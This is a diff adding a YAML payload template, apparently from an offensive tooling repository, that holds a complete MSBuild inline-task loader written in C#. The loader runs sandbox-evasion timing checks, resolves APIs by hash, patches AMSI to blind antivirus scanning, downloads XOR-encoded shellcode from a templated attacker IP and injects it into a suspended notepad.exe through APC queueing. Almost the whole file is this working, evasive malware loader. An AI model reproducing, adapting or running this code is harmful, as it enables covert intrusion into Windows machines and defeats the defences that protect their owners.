@@ -1,0 +1,334 @@
+---
+metadata:
+  filename: "msbuild-xml-apc.yaml"
+  tags: ["windows", "evasion", "shell"]
+  created: "2026-05-29"
+  authors: ["@s3mme", "@TIVKU"]
+
+content: |
+  <!-- C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe apc.xml -->
+  <Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+    <Target Name="Hello">
+      <ClassExample />
+    </Target>
+
+    <UsingTask
+      TaskName="ClassExample"
+      TaskFactory="CodeTaskFactory"
+      AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">
+      <Task>
+        <Reference Include="System" />
+        <Reference Include="System.Net" />
+        <Code Type="Class" Language="cs">
+          <![CDATA[
+            using System;
+            using System.Diagnostics;
+            using System.Net;
+            using System.Runtime.InteropServices;
+            using System.Text;
+            using System.Threading;
+
+            public class ClassExample : Microsoft.Build.Utilities.Task
+            {
+                const uint H_NTDLL                   = 0xCEF6E822;
+                const uint H_KERNEL32                = 0x8FECD63F;
+                const uint H_CreateProcessW          = 0x16B3FE88;
+                const uint H_NtAllocateVirtualMemory = 0xD33BCABD;
+                const uint H_NtWriteVirtualMemory    = 0xC5108CC2;
+                const uint H_NtProtectVirtualMemory  = 0x8C394D89;
+                const uint H_NtQueueApcThread        = 0x52E9A746;
+                const uint H_NtResumeThread          = 0xC54A46C8;
+                const uint H_NtClose                 = 0xDCD44C5F;
+                const uint H_AMSI                    = 0xE11AB5C5;
+                const uint H_AmsiOpenSession         = 0xC721E3E5;
+
+                const uint MEM_COMMIT        = 0x1000;
+                const uint MEM_RESERVE       = 0x2000;
+                const uint PAGE_READWRITE    = 0x04;
+                const uint PAGE_EXECUTE_READ    = 0x20;
+                const uint PAGE_EXECUTE_READWRITE = 0x40;
+                const uint CREATE_SUSPENDED  = 0x00000004;
+
+                const byte XOR_KEY           = 0xCA;
+
+                const int  CHUNK_SIZE        = 8192;
+                const uint CHUNK_DELAY_MS    = 20;
+
+                static readonly byte[] EncImagePath = new byte[]
+                {
+                    (byte)('C'  ^ XOR_KEY), (byte)(':'  ^ XOR_KEY), (byte)('\\' ^ XOR_KEY),
+                    (byte)('W'  ^ XOR_KEY), (byte)('i'  ^ XOR_KEY), (byte)('n'  ^ XOR_KEY),
+                    (byte)('d'  ^ XOR_KEY), (byte)('o'  ^ XOR_KEY), (byte)('w'  ^ XOR_KEY),
+                    (byte)('s'  ^ XOR_KEY), (byte)('\\' ^ XOR_KEY), (byte)('S'  ^ XOR_KEY),
+                    (byte)('y'  ^ XOR_KEY), (byte)('s'  ^ XOR_KEY), (byte)('t'  ^ XOR_KEY),
+                    (byte)('e'  ^ XOR_KEY), (byte)('m'  ^ XOR_KEY), (byte)('3'  ^ XOR_KEY),
+                    (byte)('2'  ^ XOR_KEY), (byte)('\\' ^ XOR_KEY), (byte)('n'  ^ XOR_KEY),
+                    (byte)('o'  ^ XOR_KEY), (byte)('t'  ^ XOR_KEY), (byte)('e'  ^ XOR_KEY),
+                    (byte)('p'  ^ XOR_KEY), (byte)('a'  ^ XOR_KEY), (byte)('d'  ^ XOR_KEY),
+                    (byte)('.'  ^ XOR_KEY), (byte)('e'  ^ XOR_KEY), (byte)('x'  ^ XOR_KEY),
+                    (byte)('e'  ^ XOR_KEY),
+                };
+
+                [StructLayout(LayoutKind.Sequential)]
+                struct PROCESS_INFORMATION
+                {
+                    public IntPtr hProcess;
+                    public IntPtr hThread;
+                    public int    dwProcessId;
+                    public int    dwThreadId;
+                }
+
+                [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
+                struct STARTUPINFO
+                {
+                    public int    cb;
+                    public IntPtr lpReserved;
+                    public IntPtr lpDesktop;
+                    public IntPtr lpTitle;
+                    public int    dwX;
+                    public int    dwY;
+                    public int    dwXSize;
+                    public int    dwYSize;
+                    public int    dwXCountChars;
+                    public int    dwYCountChars;
+                    public int    dwFillAttribute;
+                    public int    dwFlags;
+                    public short  wShowWindow;
+                    public short  cbReserved2;
+                    public IntPtr lpReserved2;
+                    public IntPtr hStdInput;
+                    public IntPtr hStdOutput;
+                    public IntPtr hStdError;
+                }
+
+                [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
+                delegate bool CreateProcessWDelegate(
+                    [MarshalAs(UnmanagedType.LPWStr)] string lpApplicationName,
+                    [MarshalAs(UnmanagedType.LPWStr)] StringBuilder lpCommandLine,
+                    IntPtr lpProcessAttributes,
+                    IntPtr lpThreadAttributes,
+                    bool bInheritHandles,
+                    uint dwCreationFlags,
+                    IntPtr lpEnvironment,
+                    [MarshalAs(UnmanagedType.LPWStr)] string lpCurrentDirectory,
+                    ref STARTUPINFO lpStartupInfo,
+                    out PROCESS_INFORMATION lpProcessInformation);
+
+                [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+                delegate int NtAllocateVirtualMemoryDelegate(
+                    IntPtr ProcessHandle,
+                    ref IntPtr BaseAddress,
+                    IntPtr ZeroBits,
+                    ref IntPtr RegionSize,
+                    uint AllocationType,
+                    uint Protect);
+
+                [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+                delegate int NtWriteVirtualMemoryDelegate(
+                    IntPtr ProcessHandle,
+                    IntPtr BaseAddress,
+                    byte[] Buffer,
+                    uint NumberOfBytesToWrite,
+                    out uint NumberOfBytesWritten);
+
+                [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+                delegate int NtProtectVirtualMemoryDelegate(
+                    IntPtr ProcessHandle,
+                    ref IntPtr BaseAddress,
+                    ref IntPtr RegionSize,
+                    uint NewProtect,
+                    out uint OldProtect);
+
+                [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+                delegate int NtQueueApcThreadDelegate(
+                    IntPtr ThreadHandle,
+                    IntPtr ApcRoutine,
+                    IntPtr ApcRoutineContext,
+                    IntPtr IoStatusBlock,
+                    uint   ApcReserved);
+
+                [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+                delegate int NtResumeThreadDelegate(
+                    IntPtr ThreadHandle,
+                    out uint PreviousSuspendCount);
+
+                [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+                delegate int NtCloseDelegate(IntPtr Handle);
+
+                [DllImport("kernel32.dll")]
+                static extern void Sleep(uint dwMilliseconds);
+
+                static uint Ror13(string s)
+                {
+                    uint h = 0;
+                    for (int i = 0; i < s.Length; i++)
+                    {
+                        h = (h >> 13) | (h << 19);
+                        h = unchecked(h + (byte)s[i]);
+                    }
+                    return h;
+                }
+
+                static IntPtr FindModule(uint moduleHash)
+                {
+                    foreach (ProcessModule m in Process.GetCurrentProcess().Modules)
+                    {
+                        if (Ror13(m.ModuleName.ToLowerInvariant()) == moduleHash)
+                            return m.BaseAddress;
+                    }
+                    return IntPtr.Zero;
+                }
+
+                static IntPtr ResolveExport(IntPtr moduleBase, uint nameHash)
+                {
+                    long b = moduleBase.ToInt64();
+                    int e_lfanew = Marshal.ReadInt32(new IntPtr(b + 0x3C));
+                    long ntHeaders = b + e_lfanew;
+                    long optHeader = ntHeaders + 0x18;
+                    short magic = Marshal.ReadInt16(new IntPtr(optHeader));
+                    int ddOffset = (magic == 0x20b) ? 112 : 96;
+                    int exportRva = Marshal.ReadInt32(new IntPtr(optHeader + ddOffset));
+                    if (exportRva == 0) return IntPtr.Zero;
+                    long expDir = b + exportRva;
+
+                    int numberOfNames  = Marshal.ReadInt32(new IntPtr(expDir + 0x18));
+                    int addrOfFuncs    = Marshal.ReadInt32(new IntPtr(expDir + 0x1C));
+                    int addrOfNames    = Marshal.ReadInt32(new IntPtr(expDir + 0x20));
+                    int addrOfOrdinals = Marshal.ReadInt32(new IntPtr(expDir + 0x24));
+
+                    for (int i = 0; i < numberOfNames; i++)
+                    {
+                        int nameRva = Marshal.ReadInt32(new IntPtr(b + addrOfNames + i * 4));
+                        string name = Marshal.PtrToStringAnsi(new IntPtr(b + nameRva));
+                        if (name != null && Ror13(name) == nameHash)
+                        {
+                            short ordinal = Marshal.ReadInt16(new IntPtr(b + addrOfOrdinals + i * 2));
+                            int funcRva = Marshal.ReadInt32(new IntPtr(b + addrOfFuncs + ordinal * 4));
+                            return new IntPtr(b + funcRva);
+                        }
+                    }
+                    return IntPtr.Zero;
+                }
+
+                static T Resolve<T>(IntPtr moduleBase, uint hash) where T : class
+                {
+                    IntPtr fp = ResolveExport(moduleBase, hash);
+                    if (fp == IntPtr.Zero) throw new Exception("resolve failed");
+                    return (T)(object)Marshal.GetDelegateForFunctionPointer(fp, typeof(T));
+                }
+
+                static string DecodeImagePath()
+                {
+                    char[] c = new char[EncImagePath.Length];
+                    for (int i = 0; i < EncImagePath.Length; i++)
+                        c[i] = (char)(EncImagePath[i] ^ XOR_KEY);
+                    return new string(c);
+                }
+
+                public override bool Execute()
+                {
+                    DateTime t1 = DateTime.Now;
+                    Sleep(3000);
+                    double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
+                    if (t2 < 2.5) return true;
+
+                    IntPtr ntdll = FindModule(H_NTDLL);
+                    IntPtr k32   = FindModule(H_KERNEL32);
+                    if (ntdll == IntPtr.Zero || k32 == IntPtr.Zero) return true;
+
+                    var CreateProcessW          = Resolve<CreateProcessWDelegate>(k32,   H_CreateProcessW);
+                    var NtAllocateVirtualMemory = Resolve<NtAllocateVirtualMemoryDelegate>(ntdll, H_NtAllocateVirtualMemory);
+                    var NtWriteVirtualMemory    = Resolve<NtWriteVirtualMemoryDelegate>(ntdll,    H_NtWriteVirtualMemory);
+                    var NtProtectVirtualMemory  = Resolve<NtProtectVirtualMemoryDelegate>(ntdll,  H_NtProtectVirtualMemory);
+                    var NtQueueApcThread        = Resolve<NtQueueApcThreadDelegate>(ntdll,        H_NtQueueApcThread);
+                    var NtResumeThread          = Resolve<NtResumeThreadDelegate>(ntdll,          H_NtResumeThread);
+                    var NtClose                 = Resolve<NtCloseDelegate>(ntdll,                 H_NtClose);
+
+                    IntPtr amsiBase = FindModule(H_AMSI);
+                    if (amsiBase != IntPtr.Zero)
+                    {
+                        IntPtr funcAddr = ResolveExport(amsiBase, H_AmsiOpenSession);
+                        if (funcAddr != IntPtr.Zero)
+                        {
+                            IntPtr pAddr = funcAddr;
+                            IntPtr pSize = (IntPtr)3;
+                            uint oldProt = 0;
+                            NtProtectVirtualMemory((IntPtr)(-1), ref pAddr, ref pSize, PAGE_EXECUTE_READWRITE, out oldProt);
+
+                            byte[] patch = new byte[] { 0x48, 0x31, 0xC0 };
+                            Marshal.Copy(patch, 0, funcAddr, 3);
+
+                            pAddr = funcAddr;
+                            pSize = (IntPtr)3;
+                            NtProtectVirtualMemory((IntPtr)(-1), ref pAddr, ref pSize, PAGE_EXECUTE_READ, out oldProt);
+                        }
+                    }
+
+                    int tick1 = Environment.TickCount;
+                    Thread.Sleep(1500);
+                    if ((Environment.TickCount - tick1) < 1400) return true;
+
+                    string SHELLCODE_URL = "http://{{ attacker_ip }}:{{ delivery_outbound_port }}/favicon.png";
+                    byte[] enc = new WebClient().DownloadData(SHELLCODE_URL);
+                    int total = enc.Length;
+                    if (total <= 0) return true;
+
+                    STARTUPINFO si = new STARTUPINFO();
+                    si.cb = Marshal.SizeOf(typeof(STARTUPINFO));
+                    PROCESS_INFORMATION pi;
+
+                    string imagePath = DecodeImagePath();
+                    StringBuilder cmd = new StringBuilder(imagePath);
+                    bool ok = CreateProcessW(imagePath, cmd, IntPtr.Zero, IntPtr.Zero, false,
+                        CREATE_SUSPENDED, IntPtr.Zero, null, ref si, out pi);
+                    if (!ok) return true;
+
+                    IntPtr addr = IntPtr.Zero;
+                    IntPtr size = (IntPtr)total;
+                    int st = NtAllocateVirtualMemory(pi.hProcess, ref addr, IntPtr.Zero, ref size,
+                        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+                    if (st != 0) return true;
+
+                    int written = 0;
+                    byte[] chunk = new byte[CHUNK_SIZE];
+                    while (written < total)
+                    {
+                        int n = Math.Min(CHUNK_SIZE, total - written);
+                        if (n != chunk.Length) chunk = new byte[n];
+
+                        for (int i = 0; i < n; i++) chunk[i] = (byte)(enc[written + i] ^ XOR_KEY);
+
+                        uint wrote;
+                        IntPtr dst = new IntPtr(addr.ToInt64() + written);
+                        int wst = NtWriteVirtualMemory(pi.hProcess, dst, chunk, (uint)n, out wrote);
+                        if (wst != 0) return true;
+
+                        Array.Clear(chunk, 0, n);
+                        written += n;
+
+                        if (written < total) Sleep(CHUNK_DELAY_MS);
+                    }
+
+                    IntPtr prAddr = addr;
+                    IntPtr prSize = (IntPtr)total;
+                    uint oldProtect;
+                    st = NtProtectVirtualMemory(pi.hProcess, ref prAddr, ref prSize, PAGE_EXECUTE_READ, out oldProtect);
+                    if (st != 0) return true;
+
+                    st = NtQueueApcThread(pi.hThread, addr, IntPtr.Zero, IntPtr.Zero, 0);
+                    if (st != 0) return true;
+
+                    uint prev;
+                    st = NtResumeThread(pi.hThread, out prev);
+
+                    NtClose(pi.hThread);
+                    NtClose(pi.hProcess);
+
+                    return true;
+                }
+            }
+          ]]>
+        </Code>
+      </Task>
+    </UsingTask>
+  </Project>
